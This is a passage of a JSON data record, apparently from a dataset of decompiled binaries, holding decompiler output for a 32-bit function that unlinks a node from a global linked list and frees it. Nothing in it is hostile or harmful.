        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004314bb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00434110(0x44e970, 0xc);\n    fcn.004348eb(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4695d8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4695d4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004314ff;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0042aeff(arg_8h_00);\ncode_r0x004314ff:\n        fcn.0042aeff(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00431522();\n    fcn.00434155();\n    return;\n}\n",
        "token_count": 392
    }
}